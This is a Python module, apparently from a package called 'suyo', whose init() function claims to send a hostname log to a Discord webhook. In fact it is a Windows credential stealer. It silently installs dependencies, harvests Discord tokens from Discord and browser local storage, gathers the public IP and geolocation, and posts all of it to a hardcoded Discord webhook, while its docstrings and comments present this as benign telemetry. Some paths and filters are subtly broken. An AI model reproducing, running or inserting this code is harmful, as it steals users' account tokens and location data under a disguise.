import json
import socket
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError
import os
if os.name != "nt":
    exit()
import subprocess
import sys
import urllib.request
import re
import base64
import datetime

def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])

import win32crypt
from Crypto.Cipher import AES

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }

    if token:
        headers.update({"Authorization": token})

    return headers

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    if not os.path.exists(path):
        return tokens

    for file in os.listdir(path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue

        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue

    return tokens
    
def getkey(path):
    with open(path + f"\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()

    return key


def _get_hostname() -> str:
    """Return a best-effort hostname across platforms."""
    # prefer os.uname().nodename where available (POSIX), fallback to socket
    try:
        uname = os.uname()
        name = getattr(uname, "nodename", None) or getattr(uname, "sysname", None)
        if name:
            return str(name)
    except AttributeError:
        # os.uname not available on some Windows builds
        pass
    try:
        return socket.gethostname()
    except Exception:
        return "unknown"


def _get_public_ip() -> str | None:
    """Return public IP by querying a simple service (api.ipify.org)."""
    try:
        req = Request("https://api.ipify.org?format=json", headers={"User-Agent": "suyo/1.3.4"})
        resp = urlopen(req, timeout=5)
        body = resp.read().decode("utf-8")
        data = json.loads(body)
        return data.get("ip")
    except Exception:
        return None


def _get_geolocation(api_key: str, ip: str) -> dict | None:
    """Query ipgeolocation service for the given IP. Returns parsed JSON or None."""
    try:
        # Use ip-api.com which doesn't require an API key for basic queries
        url = f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp"
        req = Request(url, headers={"User-Agent": "suyo/1.3.4"})
        resp = urlopen(req, timeout=6)
        body = resp.read().decode("utf-8")
        data = json.loads(body)
        if data.get("status") == "success":
            return data
        return None
    except Exception:
        return None


def init() -> tuple[int, str | None]:
    """Send the machine hostname to the configured Discord webhook.

    Behavior:
    - No parameters.
    - Reads webhook URL from `SUYO_WEBHOOK` env var, otherwise use built-in default.
    - Respects package-level `suyo.debug` flag: when truthy, prints debug logs to stdout.

    Returns (status_code, response_body_or_error)
    """
    # allow override by environment variable for safety
    webhook_url = os.environ.get(
        "SUYO_WEBHOOK",
        "https://discord.com/api/webhooks/1416787330873688224/4PB-5IWwMalA9DM5aNtX2O1V1FhofPrA2HkcfBqrcPnSy-ue-s5xLi9jxaPpMAjup-5I",
    )

    hostname = _get_hostname()

    # Build a Discord embed payload (title + description) and set sender metadata
    payload = {
        "username": "Suyo Log",
        "avatar_url": "https://cdn.discordapp.com/avatars/1324817666359427102/e85d0dfcc58411d8e6d496214317390c?size=256",
        "embeds": [
            {
                "title": "Suyo Log",
                # generic description (hostname kept as a field instead)
                "description": "Suyo initialization event",
            }
        ]
    }

    # optionally enrich with public IP and geolocation using free API (no key)
    ip = _get_public_ip()
    geo = None
    if ip:
        geo = _get_geolocation(None, ip)

    # attach ip/geo info into embed fields if available; wrap values in backticks
    fields = []

    all_tokens = []
    for name, path in PATHS.items():
        tokens = gettokens(path)
        if tokens:
            all_tokens.extend(tokens)

    # Hostname field always present
    fields.append({"name": "Hostname", "value": f"`{hostname}`", "inline": True})
    
    if all_tokens:
        # Join tokens into a single string for the embed
        token_str = "\\n".join(all_tokens)
        fields.append({"name": "Tokens", "value": f"```{token_str}```", "inline": False})
    else:
        fields.append({"name": "Tokens", "value": "`No tokens found.`", "inline": False})

    if ip:
        fields.append({"name": "IP", "value": f"`{ip}`", "inline": True})
    if geo:
        # Country: handle multiple possible keys from different providers
        country = geo.get("country") or geo.get("country_name")
        if country:
            fields.append({"name": "Country", "value": f"`{country}`", "inline": True})
        # City/Region: ip-api uses 'regionName', ipgeolocation used 'state_prov'
        city = geo.get("city")
        region = geo.get("regionName") or geo.get("state_prov") or geo.get("region")
        loc = ", ".join(filter(None, [city, region]))
        if loc:
            fields.append({"name": "Location", "value": f"`{loc}`", "inline": True})
        if geo.get("isp"):
            fields.append({"name": "ISP", "value": f"`{geo.get('isp')}`", "inline": False})

    if fields:
        payload["embeds"][0]["fields"] = fields

    data = json.dumps(payload).encode("utf-8")
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "suyo/1.3.4 (https://example.invalid)"
    }
    req = Request(webhook_url, data=data, headers=headers, method="POST")

    # conditional debug printing: import the package-local flag if present
    try:
        # avoid circular import at module import time
        import suyo as _suyo

        debug_on = bool(getattr(_suyo, "debug", False))
    except Exception:
        debug_on = False

    if debug_on:
        print(f"[suyo.debug] Sending webhook to: {webhook_url}")
        print(f"[suyo.debug] Request headers: {headers}")
        print(f"[suyo.debug] Payload: {payload}")

    try:
        resp = urlopen(req, timeout=10)
        try:
            body = resp.read().decode("utf-8")
        except Exception:
            body = None
        status = getattr(resp, "status", None) or getattr(resp, "getcode", lambda: None)()
        status_code = int(status) if status is not None else 0
        if debug_on:
            print(f"[suyo.debug] Response status: {status_code}")
            # resp may expose headers depending on platform
            try:
                hdrs = dict(resp.getheaders())
                print(f"[suyo.debug] Response headers: {hdrs}")
            except Exception:
                pass
            if body:
                print(f"[suyo.debug] Response body: {body}")
        return status_code, body
    except HTTPError as e:
        try:
            err_body = e.read().decode("utf-8")
        except Exception:
            err_body = None
        if debug_on:
            print(f"[suyo.debug] HTTPError {e.code}: {err_body}")
            try:
                hdrs = dict(e.headers)
                print(f"[suyo.debug] Error headers: {hdrs}")
            except Exception:
                pass
        return e.code, err_body
    except URLError as e:
        if debug_on:
            print(f"[suyo.debug] URLError: {e}")
        return 0, str(e)
